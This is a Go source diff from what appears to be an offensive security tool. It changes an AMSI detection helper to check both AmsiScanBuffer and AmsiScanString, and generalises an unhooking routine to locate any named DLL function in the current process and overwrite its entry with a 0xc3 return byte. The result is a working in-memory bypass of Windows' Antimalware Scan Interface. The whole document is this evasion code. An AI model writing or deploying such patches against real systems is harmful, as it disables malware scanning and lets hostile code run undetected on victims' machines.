@@ -94,23 +94,34 @@ func unzippedBytes(name string) (asmBytes []byte, err error) {
 	return
 }
 
-func HasAmsi() (hasAmsi bool, dll dllinquent.Result, err error) {
-	dll, err = dllinquent.FindInSelf("amsi.dll", "AmsiScanBuffer")
-	if err != nil {
-		return
+func HasAmsi() (hasAmsi bool, err error) {
+
+	toCheck := make(map[string][]string, 0)
+	toCheck["amsi.dll"] = []string{
+		"AmsiScanBuffer",
+		"AmsiScanString",
 	}
 
-	if dll != (dllinquent.Result{}) {
-		hasAmsi = true
+	for dl, funcs := range toCheck {
+		for _, fn := range funcs {
+			d, _ := dllinquent.FindInSelf(dl, fn)
+			if d != (dllinquent.Dll{}) {
+				hasAmsi = true
+			}
+		}
+
 	}
 	return
 }
 
-func UnhookAmsi(fnAddr uintptr) (err error) {
+func UnhookFunction(dllName, fn string) (dllOut dllinquent.Dll, err error) {
 	ret := []byte{0xc3}
-	err = memutils.JuggleWrite(windows.CurrentProcess(), fnAddr, ret)
+	dllOut, err = dllinquent.FindInSelf(dllName, fn)
 	if err != nil {
-		return
+		return dllOut, err
 	}
+
+	me := windows.CurrentProcess()
+	err = memutils.JuggleWrite(me, dllOut.FuncAddress, ret)
 	return
 }
